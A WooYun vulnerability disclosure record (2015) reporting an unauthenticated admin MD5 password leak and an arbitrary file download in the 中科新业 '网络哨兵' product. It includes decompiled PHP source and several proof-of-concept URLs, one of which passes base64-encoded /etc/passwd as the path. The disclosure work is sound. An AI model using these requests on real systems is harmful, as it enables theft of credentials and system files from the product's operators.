{"id": 70773, "wybug_id": "wooyun-2015-0123359", "wybug_title": "中科新业网络哨兵任意文件下载/管理员MD5密码泄露", "wybug_corp": "中科新业", "wybug_author": "menmen519", "wybug_date": "2015-07-02 10:32", "wybug_open_date": "2015-10-01 13:38", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-03：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： 中科新业网络哨兵任意文件下载/管理员MD5密码泄露 详细说明：  getpasswd.php:\n<?php/*********************//*                   *//*  Dezend for PHP5  *//*         NWS       *//*      Nulled.WS    *//*                   *//*********************/include( \"../include/globalvar.h\" );include( \"../include/connectdb.php\" );$sql = \"SELECT password FROM tab_sys_user WHERE user_id='admin'\";$gDb->query( $sql, \"N\" );$gDb->next_record( );echo $gDb->Record['password'];?>\n直接echo了管理员的密码直接看例子**.**.**.**/ucenter/include/getpasswd.php**.**.**.**/ucenter/include/getpasswd.php**.**.**.**/ucenter/include/getpasswd.php**.**.**.**/ucenter/include/getpasswd.php**.**.**.**/ucenter/include/getpasswd.php下来看看任意文件下载downfile_decode.php：\n<?php/*********************//*                   *//*  Dezend for PHP5  *//*         NWS       *//*      Nulled.WS    *//*                   *//*********************/function create_file( $filename, $flag, $type ){\t\t\t\t$fp = fopen( $filename, \"w\" );\t\t\t\t$content = \"<?xml version=\\\"1.0\\\" encoding=\\\"gb2312\\\"?>\\r\\n<Workbook xmlns=\\\"urn:schemas-microsoft-com:office:spreadsheet\\\"\\r\\n xmlns:x=\\\"urn:schemas-microsoft-com:office:excel\\\"\\r\\n xmlns:ss=\\\"urn:schemas-microsoft-com:office:spreadsheet\\\"\\r\\n xmlns:html=\\\"http://**.**.**.**/TR/REC-html40\\\">\\r\\n<Worksheet ss:Name=\\\"sheet_name\\\">\\r\\n<Table>\\r\\n<Column ss:Index=\\\"1\\\" ss:AutoFitWidth=\\\"0\\\" ss:Width=\\\"270\\\"/>\\r\\n<Row ss:Height=\\\"30\\\">\\r\\n<Cell><Data ss:Type=\\\"String\\\">title</Data></Cell>\\r\\n</Row>\\r\\n</Table>\\r\\n</Worksheet>\\r\\n</Workbook>\";case \"account\" :\t\t\t\t$sheet_name = \"虚拟账号布控\";\t\t\t\t$title = \"虚拟账号\";\t\t\t\tbreak;case \"content\" :\t\t\t\t$sheet_name = \"关键字布控\";\t\t\t\t$title = \"关键字\";\t\t\t\tbreak;case \"mac\" :\t\t\t\t$sheet_name = \"MAC地址布控\";\t\t\t\t$title = \"MAC地址\";\t\t\t\tbreak;case \"realname\" :\t\t\t\t$sheet_name = \"实名布控\";\t\t\t\t$title = \"姓名\";\t\t\t\tbreak;case \"card\" :\t\t\t\t$sheet_name = \"证件号码布控\";\t\t\t\t$title = \"证件号码\";\t\t\t\tbreak;case \"address\" :\t\t\t\t$sheet_name = \"目标地址布控\";\t\t\t\t$title = \"目标地址\";\t\t\t\tbreak;\t\t\t\t$title .= \"(注：请使用文本格式; 数字前加 ' 符.)\";\t\t\t\t$content = str_replace( \"sheet_name\", $sheet_name, $content );\t\t\t\t$content = str_replace( \"title\", $title, $content );\t\t\t\tfwrite( $fp, $content );\t\t\t\tfclose( $fp );}$gFilePath = $_GET['gFilePath'];$gFilePath = base64_decode( $gFilePath );$gFileName = substr( strrchr( $gFilePath, \"/\" ), 1 );if ( !is_readable( substr( $gFilePath, 0, strrpos( $gFilePath, \"/\" ) ) ) ){\t\t\t\techo \"权限禁止!\";\t\t\t\texit( );}else if ( !file_exists( $gFilePath ) ){\t\t\t\tcreate_file( $gFilePath, $_GET['flag'], $_GET['type'] );}$fp = fopen( $gFilePath, \"r\" );header( \"Content-type: application/octet-stream\" );header( \"Accept-Ranges: bytes\" );header( \"Accept-Length: \".filesize( $gFilePath ) );header( \"Content-Disposition: attachment; filename=\".$gFileName );echo fread( $fp, filesize( $gFilePath ) );fclose( $fp );exit( );?>\n直接看例子**.**.**.**/ucenter/include/downfile_decode.php?gFilePath=L2V0Yy9wYXNzd2Q%3D**.**.**.**/ucenter/include/downfile_decode.php?gFilePath=L2V0Yy9wYXNzd2Q%3D**.**.**.**/ucenter/include/downfile_decode.php?gFilePath=L2V0Yy9wYXNzd2Q%3D**.**.**.**/ucenter/include/downfile_decode.php?gFilePath=L2V0Yy9wYXNzd2Q%3D**.**.**.**/ucenter/include/downfile_decode.php?gFilePath=L2V0Yy9wYXNzd2Q%3D不一一举例子了   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-03 13:36 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}